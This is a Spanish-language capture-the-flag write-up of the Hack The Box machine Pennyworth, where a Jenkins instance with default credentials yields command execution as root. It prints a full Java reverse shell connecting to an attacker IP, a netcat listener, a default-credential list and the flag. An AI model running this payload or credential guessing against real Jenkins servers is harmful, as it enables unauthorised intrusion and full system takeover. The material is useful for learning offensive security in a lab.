
# HTB - Pennyworth

## Machine Information

| Information          | Value                     |
| -------------------- | ------------------------- |
| Machine              | Pennyworth                |
| IP                   | 10.129.11.18              |
| OS                   | Linux                     |
| Difficulty           | Easy                      |
| Initial Access       | Jenkins                   |
| Privilege Escalation | Jenkins Command Execution |
| Final User           | root                      |

# 1. Reconocimiento

Comenzamos realizando la enumeración de puertos y servicios de la máquina para identificar los posibles puntos de entrada.

La máquina expone un servicio web relacionado con Jenkins.

Jenkins es una plataforma de automatización utilizada principalmente para CI/CD. Dependiendo de su configuración y permisos, puede permitir ejecutar comandos en el sistema operativo mediante jobs o scripts.

En esta máquina, Jenkins representa el principal punto de entrada.

# 2. Enumeración de Jenkins

Al acceder al servicio web encontramos una instancia de Jenkins.

El objetivo inicial es obtener acceso al panel utilizando unas credenciales válidas.

Una de las posibilidades para encontrar las credenciales es realizar un ataque de fuerza bruta utilizando Hydra.

También es importante probar primero credenciales comunes y credenciales por defecto. Después de una búsqueda rápida sobre las credenciales habituales de Jenkins, podemos probar combinaciones como:

```text id="5axp2j"
admin:admin
admin:root
root:admin
root:root
```

Este tipo de comprobaciones debe hacerse antes de lanzar un ataque de fuerza bruta, ya que muchas aplicaciones o instalaciones de laboratorio utilizan credenciales débiles o por defecto.

En caso de que las credenciales no sean conocidas, podemos utilizar Hydra para probar diferentes combinaciones.

# 3. Acceso a Jenkins

Después de identificar unas credenciales válidas conseguimos acceder al panel de Jenkins.

Una vez autenticados, podemos interactuar con las funcionalidades disponibles para ejecutar comandos en el servidor.

El punto importante es que Jenkins permite ejecutar código o comandos mediante determinados jobs, dependiendo de los permisos que tenga nuestro usuario.

Esto convierte a Jenkins en una vía directa para conseguir ejecución de comandos en el sistema operativo.

# 4. Reverse Shell

Para obtener una shell interactiva utilizamos una reverse shell en Java.

El payload utilizado es:

```java id="m8q5w2"
String host="10.10.14.141";
int port=4444;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
    while(pi.available()>0)so.write(pi.read());
    while(pe.available()>0)so.write(pe.read());
    while(si.available()>0)po.write(si.read());
    so.flush();
    po.flush();
    Thread.sleep(50);
    try {
        p.exitValue();
        break;
    }catch (Exception e){}
};
p.destroy();
s.close();
```

El código realiza varias operaciones:

1. Define nuestra IP atacante:

```java id="8y0jpa"
String host="10.10.14.141";
```

2. Define el puerto donde estaremos escuchando:

```java id="1l2a7v"
int port=4444;
```

3. Ejecuta `/bin/bash` mediante `ProcessBuilder`:

```java id="g3o7sm"
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
```

4. Establece una conexión TCP hacia nuestra máquina:

```java id="j6d8pw"
Socket s=new Socket(host,port);
```

5. Obtiene los streams de entrada y salida del proceso y del socket.

6. Envía la salida de Bash hacia nuestra máquina y recibe nuestros comandos desde el socket.

De esta manera conseguimos una reverse shell.

# 5. Listener

Antes de ejecutar el payload, iniciamos un listener en nuestra máquina:

```bash id="3k2m6x"
nc -lnvp 4444
```

Una vez ejecutado el payload desde Jenkins, recibimos la conexión:

```text id="v5j9qa"
listening on 0.0.0.0 4444
Connection received on 10.129.11.18 40826
```

Ya tenemos una shell en la máquina víctima.

# 6. Enumeración de la Shell

Comenzamos comprobando el contenido del directorio actual:

```bash id="8x1zq4"
ls
```

Obtenemos:

```text id="j0w4sm"
bin
boot
cdrom
dev
etc
home
lib
lib32
lib64
libx32
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
```

La estructura corresponde a un sistema Linux.

Ahora comprobamos nuestro usuario:

```bash id="6k3pza"
whoami
```

Resultado:

```text id="r4x8cn"
root
```

Esto es especialmente importante porque significa que el proceso de Jenkins ya estaba ejecutándose con privilegios de `root`.

Por lo tanto, no necesitamos realizar una escalada de privilegios adicional.

# 7. Root Flag

Al comprobar el directorio `/root`:

```bash id="n5s7bx"
cd /root
ls
```

encontramos:

```text id="9w2fkc"
flag.txt
snap
```

Leemos la flag:

```bash id="v7h3md"
cat flag.txt
```

Resultado:

```text id="q2x9la"
9cdfb439c7876e703e307864c9167a15
```

La flag obtenida es:

```text id="c8n5wr"
9cdfb439c7876e703e307864c9167a15
```

# 8. Attack Path

```text id="e5t7qn"
Jenkins
    |
Credential Enumeration
    |
Weak/Default Credentials
    |
Jenkins Login
    |
Command Execution
    |
Java Reverse Shell
    |
Netcat Listener
    |
root
    |
/root/flag.txt
```

# 9. Vulnerabilities & Techniques

* Jenkins Enumeration
* Weak Credentials
* Default Credential Testing
* Credential Brute Force with Hydra
* Jenkins Command Execution
* Java Process Execution
* Reverse Shell
* Netcat Listener
* Linux Enumeration
* Jenkins Running with Excessive Privileges
* Direct Access as root
* Sensitive File Access

# 10. Lessons Learned

Pennyworth es una máquina relativamente sencilla, pero demuestra algo importante: una aplicación de administración como Jenkins puede convertirse directamente en un vector de ejecución de comandos cuando está mal configurada o utiliza credenciales débiles.

Una de las primeras cosas que debemos hacer cuando encontramos una instancia de Jenkins es comprobar si existen credenciales por defecto o débiles antes de realizar una enumeración más compleja.

También es importante recordar que conseguir acceso a Jenkins no significa automáticamente conseguir `root`. Hay que comprobar con qué usuario se están ejecutando los procesos.

En este caso:

```bash id="h7q2mv"
whoami
```

devuelve:

```text id="d9k4sx"
root
```

Por lo tanto, el servidor Jenkins estaba ejecutando nuestros comandos directamente con privilegios máximos.

La reverse shell utilizada también es un buen ejemplo de cómo podemos utilizar diferentes lenguajes para obtener ejecución interactiva. En este caso, Java permite crear un proceso `/bin/bash`, establecer un socket TCP y conectar sus streams con nuestra máquina atacante.

Finalmente, la máquina se resuelve prácticamente desde Jenkins:

```text id="r1c8vz"
Jenkins
    |
Credenciales
    |
Command Execution
    |
Reverse Shell
    |
root
```

Pennyworth también refuerza una idea importante para HTB:

**No siempre necesitas una escalada de privilegios si el servicio inicial ya se está ejecutando como root.**

pwned :)))))
